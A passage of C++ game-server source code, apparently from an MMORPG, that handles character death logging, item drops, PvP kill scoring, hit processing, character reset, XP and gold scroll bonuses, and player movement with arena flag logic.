         if( WhoHit == this )
         {
            dwType = 0;
            Assassin.Format("killed himself");
            _LOG_DEATH
               LOG_DEBUG_LVL1,
               "Player %s (Id %u, Acct %s, Lvl %u, Pos %u, %u, %u) killed himself (DoT)",
               (LPCTSTR)GetTrueName(),
               GetID(),
               (LPCTSTR)thisPlayer->GetFullAccountName(),
               GetLevel(),
               GetWL().X,
               GetWL().Y,
               GetWL().world
               LOG_
         }
         else
         {
            dwType = 1;
            Assassin.Format("%s",targetPlayer->self->GetTrueName());
            _LOG_DEATH
               LOG_DEBUG_LVL1,
               "PVP: Player %s (Id %u, Acct %s, Lvl %u, Pos %u, %u, %u) killed by player %s (Id %u, Acct %s, Lvl %u, Pos %u, %u, %u)",
               (LPCTSTR)GetTrueName(),
               GetID(),
               (LPCTSTR)thisPlayer->GetFullAccountName(),
               GetLevel(),
               GetWL().X,
               GetWL().Y,
               GetWL().world,
               (LPCTSTR)WhoHit->GetName( _DEFAULT_LNG ),
               WhoHit->GetID(),
               (LPCTSTR)targetPlayer->GetFullAccountName(),
               WhoHit->GetLevel(),
               WhoHit->GetWL().X,
               WhoHit->GetWL().Y,
               WhoHit->GetWL().world
               LOG_
         }
      }
      else
      {
         dwType = 0;
         Assassin.Format("%s",WhoHit->GetName( _DEFAULT_LNG ));
         _LOG_DEATH
            LOG_DEBUG_LVL1,
            "Player %s (Id %u, Acct %s, Lvl %u, Pos %u, %u, %u ) got killed by monster %s",
            (LPCTSTR)GetTrueName(),
            GetID(),
            (LPCTSTR)thisPlayer->GetFullAccountName(),
            GetLevel(),
            GetWL().X,
            GetWL().Y,
            GetWL().world,
            (LPCTSTR)WhoHit->GetName( _DEFAULT_LNG )
            LOG_
      }
   }
   else
   {
      dwType = 0;
      Assassin.Format("some unknown unit");
      _LOG_DEATH
         LOG_DEBUG_LVL1,
         "Player %s (Id %u, Acct %s, Lvl %u, Pos %u, %u, %u ) got killed by some unknown unit.",
         (LPCTSTR)GetTrueName(),
         GetID(),
         (LPCTSTR)thisPlayer->GetFullAccountName(),
         GetLevel(),
         GetWL().X,
         GetWL().Y,
         GetWL().world
         LOG_
   }

   CT4CLog::SaveDeathLog(Victime,Assassin,dwType,0);
   TRACE(_T("DEATH"));

   // Create a death data structure and query each objects
   // to know if any of them can do anything about this death.
   BOOL boSavePlayer = FALSE;
   CString csText;
   CString csTemp;

   SendGlobalEffectMessage( MSG_OnDeath, NULL, NULL, NULL );

   // If player is high enough to be worth having a death report.
   if(GetLevel() > MIN_LEVEL_DEATH_REPORT)
   {
      csText = "\r\nCurrent stats:\r\n";
      csTemp.Format(_T("	LEVEL:	%u\r\n"), GetLevel());
      csText += csTemp;
      csTemp.Format(_T("	HP:	%u\r\n"), GetMaxHP());
      csText += csTemp;
      csTemp.Format(_T("	AGI:	%u(%u)\r\n"), GetTrueAGI(), GetAGI());
      csText += csTemp;
      csTemp.Format(_T("	END:	%u(%u)\r\n"), GetTrueEND(), GetEND());
      csText += csTemp;
      csTemp.Format(_T("	INT:	%u(%u)\r\n"), GetTrueINT(), GetINT());
      csText += csTemp;
      csTemp.Format(_T("	STR:	%u(%u)\r\n"), GetTrueSTR(), GetSTR());
      csText += csTemp;
      csTemp.Format(_T("	WIS:	%u(%u)"), GetTrueWIS(), GetWIS());
      csText += csTemp;
      backpack->Lock();

      _LOG_DEATH
         LOG_DEBUG_LVL2,
         (char *)(LPCTSTR)csText
         LOG_

         csText.Empty();
      csTemp.Empty();

      csTemp += _T("\r\nBackpack: ");

      if( backpack->NbObjects() == 0 )
      {
         csTemp = _T("(empty)");
      }
      else
      {        
         int nItemsLogged = 0;
         backpack->ToHead();		

         while(backpack->QueryNext())
         {
            csTemp += backpack->Object()->GetName( GetLang() );
            csTemp += _T(", ");
            if( !(nItemsLogged % 10) && nItemsLogged != 0 )
            {
               _LOG_DEATH
                  LOG_DEBUG_LVL2,
                  (char *)(LPCTSTR)csTemp
                  LOG_
                  csTemp.Empty();
            }
            nItemsLogged++;
         }
      }
      backpack->Unlock();
      _LOG_DEATH
         LOG_DEBUG_LVL2,
         (char *)(LPCTSTR)csTemp
         LOG_

         csTemp = _T("\r\nEquipped: ");

      int nItemsLogged = 0;
      int i;
      for(i = 0; i < EQUIP_POSITIONS; i++)
      {            
         if(equipped[i])
         {
            csTemp += equipped[i]->GetName( GetLang() );
            csTemp += _T(", ");
            if( !(nItemsLogged % 10) && nItemsLogged != 0 )
            {
               _LOG_DEATH
                  LOG_DEBUG_LVL2,
                  (char *)(LPCTSTR)csTemp
                  LOG_
                  csTemp.Empty();
            }
            nItemsLogged++;
         }
      }
      _LOG_DEATH
         LOG_DEBUG_LVL2,
         (char *)(LPCTSTR)csTemp
         LOG_
         csText.Empty();
   }

   // Get the WL before it is changed.
   WorldPos wlPlayerPos = GetWL();
   __int64 nXP = xp;
   DWORD goldLoss = 0;

   bool boFound = false;	

   // Normal death
   if( boFound == false )
   {
      // List of objects which should be spilled on the floor as the player 'dies'
      TemplateList< Unit > equipSpillList;
      TemplateList< Unit > invSpillList;

      GAME_RULES::DeathPenalties( this, WhoHit, &invSpillList, &equipSpillList, goldLoss,FALSE,0.00);

      csText.Empty();
      csTemp.Empty();

      // If player is high enough to be worth logging.
      if( GetLevel() > MIN_LEVEL_DEATH_REPORT )
      {
         // Log xp loss.
         DWORD dwXPloss = static_cast< DWORD >( nXP - xp );
         csTemp.Format( "\r\nPlayer lost %u experience points.", dwXPloss );
         csText += csTemp;
         int nItemsLogged = 0;

         csText += "\r\nInventory items lost: ";
         // Scroll through the list of items lost on the floor.
         if( invSpillList.NbObjects() == 0 )
         {
            csText += "(none)";
         }
         else
         {
            invSpillList.ToHead();
            while( invSpillList.QueryNext() )
            {
               csTemp.Format( "%s, ", invSpillList.Object()->GetName( _DEFAULT_LNG ) );
               csText += csTemp;
               if( !(nItemsLogged % 10) && nItemsLogged != 0 )
               {
                  _LOG_DEATH
                     LOG_DEBUG_LVL2,
                     (char *)(LPCTSTR)csText
                     LOG_
                     csText.Empty();                
               }
               nItemsLogged++;
            }
         }
         nItemsLogged = 0;
         _LOG_DEATH
            LOG_DEBUG_LVL2,
            (char *)(LPCTSTR)csText
            LOG_

            csText = "\r\nEquipped items lost: ";
         // Scroll through the list of items lost on the floor.
         if( equipSpillList.NbObjects() == 0 )
         {
            csText += "(none)";
         }
         else
         {
            equipSpillList.ToHead();
            while( equipSpillList.QueryNext() )
            {
               csTemp.Format( "%s, ", equipSpillList.Object()->GetName( _DEFAULT_LNG ) );
               csText += csTemp;
               if( !(nItemsLogged % 10) && nItemsLogged != 0 )
               {
                  _LOG_DEATH
                     LOG_DEBUG_LVL2,
                     (char *)(LPCTSTR)csText
                     LOG_
                     csText.Empty();                
               }
               nItemsLogged++;
            }
         }
      }
      _LOG_DEATH
         LOG_DEBUG_LVL2,
         (char *)(LPCTSTR)csText
         LOG_
         csText.Empty();                

      Unit *lpObject;
      int k = rnd( 0, 7 );

      // Transfert the inventory and equipped spill list into a single list for dropping.
      TemplateList< Unit > tlObjSpillList;
      invSpillList.ToHead();
      while( invSpillList.QueryNext() )
      {
         tlObjSpillList.AddToTail( invSpillList.Object() );
      }

      equipSpillList.ToHead();
      while( equipSpillList.QueryNext() )
      {
         tlObjSpillList.AddToTail( equipSpillList.Object() );
      }

      WorldMap *wlWorld = TFCMAIN::GetWorld( wlPlayerPos.world );
      if( wlWorld )
      {    
         // Disperse all spilled items around the unit's corpse.
         tlObjSpillList.ToHead();
         while( tlObjSpillList.QueryNext() ){
            lpObject = tlObjSpillList.Object();

            // Find a valid position for the item (same algo. as the containers).
            WorldPos wlFoundPos = wlPlayerPos;
            /*switch( k++ ){
            case 0: wlFoundPos.Y = wlPlayerPos.Y;
            wlFoundPos.X = wlPlayerPos.X; break;//BLBLBL ajouté 0 ici (et passé à 8 choix)
            case 1: wlFoundPos.Y = wlPlayerPos.Y + rnd( 1, 2 ); break;
            case 2: wlFoundPos.X = wlPlayerPos.X + rnd( 1, 2 ); break;
            case 3: wlFoundPos.Y = wlPlayerPos.Y - rnd( 1, 2 ); break;
            case 4: wlFoundPos.X = wlPlayerPos.X - rnd( 1, 2 ); break;
            case 5: wlFoundPos.X = wlPlayerPos.X + rnd( 1, 2 );
            wlFoundPos.Y = wlPlayerPos.Y + rnd( 1, 2 ); break;
            case 6: wlFoundPos.X = wlPlayerPos.X + rnd( 1, 2 );
            wlFoundPos.Y = wlPlayerPos.Y - rnd( 1, 2 ); break;
            case 7: wlFoundPos.X = wlPlayerPos.X - rnd( 1, 2 ); 
            wlFoundPos.Y = wlPlayerPos.Y + rnd( 1, 2 ); break;
            case 8: wlFoundPos.X = wlPlayerPos.X - rnd( 1, 2 );
            wlFoundPos.Y = wlPlayerPos.Y - rnd( 1, 2 ); break;
            } 
            k = k > 8 ? 0 : k;

            // If spot isn't a valid one, make the world find it..!
            if( wlWorld->IsBlocking( wlFoundPos ) ){
            wlFoundPos = wlWorld->FindValidSpot( wlPlayerPos, 3, true );//BLBLBL 
            //true dans le dernier parametre car on ne veut surtout pas que des items se vaporize en ne trouvant pas de place !
            }
            */

            TRACE( "\r\nFound pos = %u %u %u", wlFoundPos.X, wlFoundPos.Y, wlFoundPos.world );

            // if it found a valid position
            if( wlFoundPos.X > 0 && wlFoundPos.Y > 0 )
            {
               // Deposit the object.
               wlWorld->deposit_unit( wlFoundPos, lpObject );
               lpObject->BroadcastPopup( wlFoundPos );//BLBLBL

               // Log spilled item.
               _LOG_ITEMS
                  LOG_MISC_1,
                  "Player's  %s (%s) death at ( %u, %u, %u ) spilled item %s ID( %u ) at ( %u, %u, %u ).",
                  GetTrueName(),
                  GetPlayer()->GetFullAccountName(),
                  wlPlayerPos.X,
                  wlPlayerPos.Y,
                  wlPlayerPos.world,
                  (LPCTSTR)lpObject->GetName( _DEFAULT_LNG ),
                  lpObject->GetStaticReference(),
                  wlFoundPos.X,
                  wlFoundPos.Y,
                  wlFoundPos.world
                  LOG_

                  lpObject->BroadcastPopup( wlPlayerPos );
            }
            else
            {
               // If no position could be found, destroy the object.
               //tlObjSpillList.DeleteAbsolute();
               tlObjSpillList.Object()->DeleteUnit();
               tlObjSpillList.Remove();
            }
         }
      }
      else
      {
         // If no world object could be fetch, destroy list of objects.
         //tlObjSpillList.AnnihilateList();
         tlObjSpillList.ToHead();
         while( tlObjSpillList.QueryNext() )
         {
            tlObjSpillList.Object()->DeleteUnit();
            tlObjSpillList.Remove();
         }
      }

      // Finally fetch death position.
      DWORD dwPosValue = ViewFlag( __FLAG_DEATH_LOCATION );
      BOOL  boDefaultPos = FALSE;
      WorldPos wlTeleportPos;

      if( dwPosValue == 0 )
      {
         // If flag doesn't exist use default death position.
         boDefaultPos = TRUE;
      }
      else
      {	
         wlTeleportPos.X = ( (WORD)( dwPosValue >> 20 ) ) & 0x0FFF;	// Strip the first 4 bits of the word.
         wlTeleportPos.Y = ( (WORD)( dwPosValue >> 8 )  ) & 0x0FFF;
         wlTeleportPos.world = ( (BYTE)( dwPosValue ) & 0xFF );

         WorldMap *wlWorld = TFCMAIN::GetWorld( wlTeleportPos.world );

         // If world doesn't exist use default death position.
         if( wlWorld == NULL ){
            boDefaultPos = TRUE;
         }
         else
         {
            // If worldpos isn't a valid position use default death position.
            if( !wlWorld->IsValidPosition( wlTeleportPos ) )
            {
               boDefaultPos = TRUE;
            }
         }
      }

      if( boDefaultPos )
      {
         // Use default death pos.
         wlTeleportPos = wlDeathPos;
      }

      /*
      TFCPacket sending;
      sending << (RQ_SIZE)RQ_XPchanged; //OBSOLETE  On DeathOld function,,,
      sending << (long)(GetXP() >> 32);
      sending << (long)GetXP();
      SendPlayerMessage( sending );
      */

      WorldPos wlNull = { 0, 0, 0 };

      if(theApp.dwDeadSpellID == 0x00)
      {
         Broadcast::BCSpellEffect( wlPlayerPos, _DEFAULT_RANGE, DEATH_EFFECT_ID, GetID(), 0, wlPlayerPos,wlNull,GetNextGlobalEffectID(),0);
      }
      else
      {
         Broadcast::BCSpellEffect( wlPlayerPos, _DEFAULT_RANGE, theApp.dwDeadSpellID, GetID(), 0, wlPlayerPos,wlNull,GetNextGlobalEffectID(),0);
         //BOOL bRet = _CastSpellDirect(theApp.dwDeadSpellID, this );
         Sleep(1000);
      }

      // Avoid a crash when vaporizing the unit lol
      if( WhoHit != NULL )
      {		
         // Increase the death flags if a player killed me		
         if( WhoHit->GetType() == U_PC )
         {
            DWORD dwDeathValue = ViewFlag( __FLAG_DEATH_NUMBER, 0 );
            DWORD dwKillValue = WhoHit->ViewFlag( __FLAG_KILL_NUMBER, 0 );

            int bPoints = false;

            bPoints = CAutoConfig::GetIntValue( theApp.csT4CKEY+"PVPDeath", "CRIME_POINTS" );

            // Sysop don't wanna count the crime but prefers the point system
            if( bPoints == 1 )
            {
               // Determines the points to give or to take away
               int Range = WhoHit->GetLevel() - this->GetLevel();

               if( Range >= 100 )
               {
                  dwDeathValue++;
                  dwKillValue -= 5;
               }			
               else if( Range >= 70 )
               {
                  dwDeathValue++;
                  dwKillValue -= 3;
               }			
               else if( Range > 35 )
               {
                  dwDeathValue++;
                  dwKillValue -= 1;
               }
               else if (Range >= -25 && Range <= 35 )
               {
                  dwDeathValue++;
                  dwKillValue++;
               }
               else if( Range <= -100 )
               {
                  dwDeathValue++;
                  dwKillValue += 4;
               }
               else if( Range <= -50 )
               {
                  dwDeathValue++;
                  dwKillValue += 3;
               }
               else if( Range < -25 )
               {
                  dwDeathValue++;
                  dwKillValue += 2;
               }
            }
            else
            {
               dwDeathValue++;
               dwKillValue++;
            }

            SetFlag( __FLAG_DEATH_NUMBER, dwDeathValue );
            WhoHit->SetFlag( __FLAG_KILL_NUMBER, dwKillValue );			
         }
      }

      // Activate the trigger
      SendGlobalEffectMessage( MSG_OnDeath, NULL, NULL, NULL );

      // Teleport user to its death location.
      Teleport( wlTeleportPos, 1 );		

	   {
         // Tell the player that the gem of destiny saved it.
         TELL_PLAYER( 16 );	
      }
   }
   else
   {
   }
   // Set the unit's under block to SAFE_HAVEN to avoid that a PC already at the death pos, casting a normal block,
   // kills the player.
   SetUnderBlock( __INDOOR_SAFE_HAVEN );	

   Unlock();
}
/******************************************************************************/
int Character::hit(LPATTACK_STRUCTURE blow, Unit *WhoHit)
/******************************************************************************/
{
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return 0;
   }
   /// *****E_NMS_DEATH 

   Lock();
   // Then process all hit-intrinsic skills
   tlusSkills[Hook_OnHit].ToHead();

   while(tlusSkills[Hook_OnHit].QueryNext())
   {
      LPUSER_SKILL lpusUserSkill = tlusSkills[Hook_OnHit].Object();

      Skills::ExecuteSkill(lpusUserSkill->GetSkillID(), HOOK_HIT,
         this, NULL, WhoHit, blow, NULL, lpusUserSkill);
   }

   // If the unit who hit isn't this character.
   if( WhoHit != this )
   {
      QueryEffects( MSG_OnHit, blow, NULL, WhoHit );
   }

   // This is the final hit, it basically handles death :)
   int HP    = GetHP();
   int MaxHP = GetMaxHP();

   TRACE(_T("Max HP = %u "), MaxHP);
   TRACE(_T("HP before hit on player %d"), HP);

   Players *user = (Players *)ThisPlayer;

   if( user != NULL )
   {
      if( !( user->GetGodFlags() & GOD_INVINCIBLE ) )
      {
         HP -= (int)blow->Strike;	
         TRACE(_T(",,HP after hit on player %d"), HP);
      }
   }

   // Call OnHit for all equipped items.
   if(equipped[ring1])		equipped[ring1]		->SendUnitMessage(MSG_OnHit, equipped[ring1], this, WhoHit, blow, NULL);
   if(equipped[ring2])		equipped[ring2]		->SendUnitMessage(MSG_OnHit, equipped[ring2], this, WhoHit, blow, NULL);
   if(equipped[Orbe1])		equipped[Orbe1]		->SendUnitMessage(MSG_OnHit, equipped[Orbe1], this, WhoHit, blow, NULL);
   if(equipped[bracelets]) equipped[bracelets]	->SendUnitMessage(MSG_OnHit, equipped[bracelets], this, WhoHit, blow, NULL);
   if(equipped[necklace])	equipped[necklace]	->SendUnitMessage(MSG_OnHit, equipped[necklace], this, WhoHit, blow, NULL);
   if(equipped[body])		equipped[body]		->SendUnitMessage(MSG_OnHit, equipped[body], this, WhoHit, blow, NULL);
   if(equipped[belt])		equipped[belt]		->SendUnitMessage(MSG_OnHit, equipped[belt], this, WhoHit, blow, NULL);
   if(equipped[feet])		equipped[feet]		->SendUnitMessage(MSG_OnHit, equipped[feet], this, WhoHit, blow, NULL);
   if(equipped[gloves])	equipped[gloves]	->SendUnitMessage(MSG_OnHit, equipped[gloves], this, WhoHit, blow, NULL);
   if(equipped[helm])		equipped[helm]		->SendUnitMessage(MSG_OnHit, equipped[helm], this, WhoHit, blow, NULL);
   if(equipped[legs])		equipped[legs]		->SendUnitMessage(MSG_OnHit, equipped[legs], this, WhoHit, blow, NULL);

   // If item isn't a two handed weapon
   if( equipped[ weapon_right ] == equipped[ weapon_left ] )
   {
      if(equipped[ weapon_right ]) equipped[ weapon_right ]->SendUnitMessage(MSG_OnHit, equipped[ weapon_right ], this, WhoHit, blow, NULL);
   }
   else
   {
      // Otherwise query both hand positions for any shields.
      if(equipped[ weapon_right ]) equipped[ weapon_right ]->SendUnitMessage(MSG_OnHit, equipped[ weapon_right ], this, WhoHit, blow, NULL);
      if(equipped[ weapon_left ]) equipped[ weapon_left ]->SendUnitMessage  (MSG_OnHit, equipped[ weapon_left ],  this, WhoHit, blow, NULL);
   }

   if( HP < 0 )
   {
      HP = 0;
   }
   TFCPacket sending;	
   sending << (RQ_SIZE)RQ_HPchanged; // user already in game or not registred
   sending << (long)HP;
   sending << (long)MaxHP;	
   SendPlayerMessage( sending );

   TRACE( "--Sent message" );

   sending.Destroy( );

   if( user != NULL && user->in_game )
   {
      if(HP <= 0 && !( user->GetGodFlags() & GOD_INVINCIBLE || user->GetGodFlags() & GOD_CANNOT_DIE ) )// if player kinda died..	
      { 
         // kill the player.
         Death( blow, WhoHit );
         Unlock();
         return( -1 );
      }
      else
      {
         SetHP( HP, false );
         if(rnd( 0, 100 ) <10)
            Broadcast::BCSpellEffect( GetWL(), 30, 30350, GetID(), 0, GetWL(),GetWL(),GetNextGlobalEffectID(),0);
         
      }
   }

   TRACE( "\r\nExiting train unit" );

   Unlock();

   return 0;
}
/******************************************************************************/
BOOL Character::Kill()
/******************************************************************************/
{
   return KillMe;
}
/******************************************************************************/
WORD Character::GetCorpse()
/******************************************************************************/
{
   return Corpse;
}
/******************************************************************************/
// Basically resets everything there is to reset on a player
void Character::reset_character(bool bValidGuildChest)
{
   WorldPos WL;
   WL.X = 0xFFFFFFFF;
   WL.Y = 0xFFFFFFFF;
   WL.world = 0xFFFFFFFF;
   SetWL(WL);

   // Destroy all static and dynamic flags on the PC
   // DestroyStaticFlags();
   DestroyFlags();

   // removes equipped objects
   DestroyEquipment();

   // removes the backpack	
   backpack->ToHead();
   while(backpack->QueryNext())
   {
      backpack->Object()->DeleteUnit();
      backpack->Remove();
   }

   //Clears the chest
   chest->ResetContainer();

   SetHP(0, false);
   SetMaxHP(1);
   SetMana(0);
   SetMaxMana(0);

   SetXP(0);
   SetGold(0, FALSE );

   exhaust.move = 0;
   exhaust.attack = 0;
   exhaust.mental = 0;
   exhaust.boWalking = FALSE;
   SetGuildName("");
   SetGuildNameInvited("",NULL);
   SetGuildTitle(0);
   SetGuildPermission(0);
   SetGuildPermissionTmp(0);
   wNbSkillPnts = 0;
   wNbStatPnts = 0;
   Corpse = 0;
   Appearance = 0;

   m_strCompagnonName = "";
   m_dwCompagnonID    = 0;
   m_iRPXP            = 0;
   m_iRPXPPoint       = 0;
   m_iRPPhase         = -1;
   m_iArenaID         = 0;
   m_iArenaType       = -1;
   m_iArenaKill       = 0;
   m_iArenaDead       = 0;
   m_iArenaFlag       = 0;
   m_iArenaTeam       = 0;
   m_dwArenaLastStart = 0;
   m_dArenaPVP        = 0.00;
   m_iArenaINACTIFTime= 0;
   m_iArenaINACTIFMin = 0;
   m_iArenaDUREETime  = 0;
   m_iArenaDUREEMin   = 0;
   m_iArenaPOINTS     = 0;
   m_iRPTalkCnt       = 0;
   m_iRPNOTTalkCnt    = 0;
   lpGroup = NULL; // No group by default.

   LockChestChanged.Lock();
   bChestChanged = FALSE;
   LockChestChanged.Unlock();

}
/******************************************************************************/
__int64 Character::GetXP()
/******************************************************************************/
{
   CAutoLock autoStatsLock( &statsLockXP );
   return xp;
}
/******************************************************************************/
void Character::SetXP(__int64 XP,bool bforce)
/******************************************************************************/
{
   CAutoLock autoStatsLock( &statsLockXP );
   if (GetLevel() < MAX_LEVEL_CAN_HAVE || bforce) 
   { 
      if(m_iRPPhase == -1 || bforce) //si en phase RP on ne set pas les XP... il sont disable
         xp = XP;
   }
}

__int64 Character::GetXPScrollBonnus()
{
   if(theApp.dwManageScrollXP == 0)
	   return 0;

   Int64ToDWord itd;
   itd.dwVal[0] = ViewFlag(__FLAG_XP_SCROLL_VALUE_LO);
   itd.dwVal[1] = ViewFlag(__FLAG_XP_SCROLL_VALUE_HI);
   return itd.i64Val;
}

void Character::SetXPScrollBonnus(__int64 XP)
{
   if(theApp.dwManageScrollXP == 0)
  	  return;


   Int64ToDWord itd;
   itd.i64Val = XP;
   SetFlag(__FLAG_XP_SCROLL_VALUE_LO,itd.dwVal[0]);
   SetFlag(__FLAG_XP_SCROLL_VALUE_HI,itd.dwVal[1]);
}

void Character::AddXPScrollBonnus(__int64 XP)
{
   if(theApp.dwManageScrollXP == 0)
      return;

   __int64 XPNew =  (__int64)(XP*((double)ViewFlag(__FLAG_SCROLL_XP_MULTIPLICATEUR)/100.00));
   Int64ToDWord itd;
   itd.i64Val = GetXPScrollBonnus()+XPNew;
   SetFlag(__FLAG_XP_SCROLL_VALUE_LO,itd.dwVal[0]);
   SetFlag(__FLAG_XP_SCROLL_VALUE_HI,itd.dwVal[1]);
}

__int64 Character::GetORScrollBonnus()
{
   if(theApp.dwManageScrollXP == 0)
      return 0;

   Int64ToDWord itd;
   itd.dwVal[0] = ViewFlag(__FLAG_OR_SCROLL_VALUE_LO);
   itd.dwVal[1] = ViewFlag(__FLAG_OR_SCROLL_VALUE_HI);
   return itd.i64Val;
}

void Character::SetORScrollBonnus(__int64 iOr)
{
   if(theApp.dwManageScrollXP == 0)
      return;


   Int64ToDWord itd;
   itd.i64Val = iOr;
   SetFlag(__FLAG_OR_SCROLL_VALUE_LO,itd.dwVal[0]);
   SetFlag(__FLAG_OR_SCROLL_VALUE_HI,itd.dwVal[1]);
}

void Character::AddORScrollBonnus(__int64 iOr)
{
   if(theApp.dwManageScrollXP == 0)
      return;
   __int64 iORNew =  (__int64)(iOr*((double)ViewFlag(__FLAG_SCROLL_OR_MULTIPLICATEUR)/100.00));
   Int64ToDWord itd;
   itd.i64Val = GetORScrollBonnus()+iORNew;
   SetFlag(__FLAG_OR_SCROLL_VALUE_LO,itd.dwVal[0]);
   SetFlag(__FLAG_OR_SCROLL_VALUE_HI,itd.dwVal[1]);
}

void Character::AddYoursHealingValue(int iVal)
{
   dwLastHealing+=iVal;
}

void Character::ProcessYoursHealingDisplay()
{
   try
   {
      if(theApp.dwSendDamageHealingSystem == 0)
         return;

      if(dwLastHealing > 0)
      {
         DWORD dwSendValue = dwLastHealing;
         dwLastHealing = 0;

         DWORD color = CL_HEAL_DAMAGE_3;
         CString strDamage;
         strDamage.Format("+%d",(int)dwSendValue);
         TFCPacket sending;
         sending << (RQ_SIZE)RQ_HealingUnit;
         sending << (long)GetID();
         sending << strDamage;
         sending << (long)color;
         SendPlayerMessage( sending );
      }
   }
   catch(...)
   {
      _LOG_DEBUG
         LOG_DEBUG_LVL1,
         "EXCEPTION--> Character::ProcessYoursHealingDisplay"
         LOG_
   }
}



//////////////////////////////////////////////////////////////////////////////////////////////
TemplateList <Unit> *Character::GetBackpack(){
   return backpack;
}
/******************************************************************************/
void Character::SetBackpack(TemplateList <Unit> *LList)
/******************************************************************************/
{
   backpack = LList;
}
/******************************************************************************/
ItemContainer *Character::GetChest() 
/******************************************************************************/
{
   return chest;
}
/******************************************************************************/
void Character::SetChest(ItemContainer *newChest)
/******************************************************************************/
{
   chest = newChest;
}
/******************************************************************************/
void Character::packet_stats(TFCPacket &packet, bool gameop)
{
   if( gameopContext != NULL && !gameop )
   {
      gameopContext->packet_stats( packet, true );
      return;
   }

   packet << (char)GetAGI();
   packet << (char)GetEND();
   packet << (char)GetINT();
   packet << (char)GetLCK(); // luck
   packet << (char)GetSTR();
   packet << (char)0; // wil
   packet << (char)GetWIS();
   packet << (long)GetMaxHP();
   packet << (long)GetHP();
   packet << (short)GetMaxMana();
   packet << (short)GetMana();
}

/******************************************************************************/
WorldPos Character::MoveUnit(DIR::MOVE where, BOOL boAbsolute, bool boCompressMove, bool boBroadcastMove )
/******************************************************************************/
{
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return GetWL();
   }
   /// *****E_NMS_DEATH 

   WORD wDisturbedFlags = 0|DISTURB_CLOSECHEST|DISTURB_CLOSETRADE;//|DISTURB_UNHIDE; <- If you put UNHIDE, how do you want to use Sneak?!

   if (theApp.dwRobWhileWalkingEnabled)
   {
      wDisturbedFlags |= DISTURB_DONTCANCELROB;
   }
   Disturbed(wDisturbedFlags);

   Players *player = (Players *)ThisPlayer;
   BOOL god = FALSE;

   if( player != NULL ) 
   {
      if( player->GetGodFlags() & GOD_NO_CLIP ){
         god = TRUE;
      }
   }

   // If move is absolute, then godly move!
   if( boAbsolute )
   {
      god = TRUE;
   }

   WorldPos WL;
   WorldPos CurrentWL = GetWL();

   int west = where == 1 ? 8 : where - 1;
   int east = where == 8 ? 1 : where + 1;
   int nMovedPos = where;

   WL = Unit::MoveUnit(where, god, boCompressMove, boBroadcastMove );

   if( SAME_POS( WL, CurrentWL ) )
   {
      WL = Unit::MoveUnit( (DIR::MOVE)west, god, boCompressMove, boBroadcastMove );
      nMovedPos = west;

      if( SAME_POS( WL, CurrentWL ) )
      {
         WL = Unit::MoveUnit( (DIR::MOVE)east, god, boCompressMove, boBroadcastMove );
         nMovedPos = east;
      }
   }

   // If unit actually moved
   if( !( SAME_POS( WL, CurrentWL ) ) && !( player->GetGodFlags() & GOD_NO_MONSTERS ) )
   {
      if( nMovedPos != 0 )
      {
         if( nMovedPos > 8 )
         {
            nMovedPos = 8; 
         }

         if( nMovedPos < 1 ){
            nMovedPos = 1; 
         }

         WorldMap *wlWorld = TFCMAIN::GetWorld( CurrentWL.world );
         if( wlWorld != NULL )
         {
            // Check for any popuped up hives
            wlWorld->VerifyPeripheralHives( CurrentWL, (DIR::MOVE)nMovedPos );
         }
      }
   }

   // If the player is hidden and doesn't have the sneak skill.
   LPUSER_SKILL uskill = GetSkill( __SKILL_SNEAK );
   if( ViewFlag( __FLAG_HIDDEN ) != 0 )
   {
      if( uskill == NULL || uskill->GetSkillPnts( this ) == 0 )
      {
         Unhide();
      }
   }

   // Then process all move-intrinsic skills
   tlusSkills[Hook_OnMove].ToHead();	
   while(tlusSkills[Hook_OnMove].QueryNext())
   {
      LPUSER_SKILL lpusUserSkill = tlusSkills[Hook_OnMove].Object();
      Skills::ExecuteSkill(lpusUserSkill->GetSkillID(), HOOK_MOVE,this, NULL, NULL, &WL, NULL, lpusUserSkill);
   }

   if( !SAME_POS( WL, CurrentWL ) )
   {

      //NMNMNM_PATCH_SPELL_POS  Envoie toujours la pos du players...
      for(UINT kk=0 ; kk<theApp.m_aPosWSpell.GetSize() ; kk++)
      {
         if(theApp.m_aPosWSpell[kk].X == WL.X &&
            theApp.m_aPosWSpell[kk].Y == WL.Y &&
            theApp.m_aPosWSpell[kk].W == WL.world )
         {
            //on activate ce spell..
            CastSpellNoCheckFull(theApp.m_aPosWSpell[kk].SpellID,this);
            break;
         }
      }


      if(GetUnderBlockMap() == __BLOCK_CAST_SPELL_WHEN_WALK_ON_THIS ||
         GetUnderBlockMap() == __FULL_PVP_CANNOT_REALLY_DIE_DROP_ORROB_CAST_SPELL)
      {
         //we move on the FloorEffect, cast spell...
         if(theApp.m_dwFloorDamageSpellID != 0)
            CastSpellNoCheckFull(theApp.m_dwFloorDamageSpellID,this);
      }


      if(GetArenaID() >0) //Valid selon type de jeux...
      {
         if(GetUnderBlockMap() == __INDOOR_SAFE_HAVEN && GetArenaTeam() >0 && ViewFlag(__FLAG_PLAYER_ARENE_HAVE_FLAG) >0 )
         {
            _LOG_ARENA
               LOG_ALWAYS,
               "ARENE%d ID %d: Player ID:%d %s (%s) Walk on safe zone with flag... flag go to default position",GetArenaID(),GetArenaType(),
               GetID(),
               GetTrueName(),
               GetPlayer()->GetFullAccountName()
               LOG_

            Broadcast::BCSpellEffect( GetWL(), _DEFAULT_RANGE, 30304/*LevelUpSkin*/, GetID(), 0, GetWL(),GetWL(),GetNextGlobalEffectID(),0);
            
            if(GetArenaType()==ARENE1_TYPE)
            {
               Arena1Master::SummonFlagRnd(GetArenaID()-1);
               CString strTmp;
               strTmp.Format(_STR( 15493, GetLang() ),GetTrueName());
               Arena1Master::SendMessageToAll(strTmp,CL_YELLOW,GetArenaID()-1);
            }
            else if(GetArenaType()==ARENE2_TYPE)
            {
               Arena2Master::SummonFlagHome(ViewFlag(__FLAG_PLAYER_ARENE_HAVE_FLAG)-1,GetArenaID()-1);
               CString strTmp;
               strTmp.Format(_STR( 15493, GetLang() ),GetTrueName());
               Arena2Master::SendMessageToAll(strTmp,CL_YELLOW,GetArenaID()-1);
            }

            SetFlag(__FLAG_NMS_TAG_DISPLAY_OVER_HEAD,0);
            SetFlag(__FLAG_PLAYER_ARENE_HAVE_FLAG,0);
            TFCPacket sending;
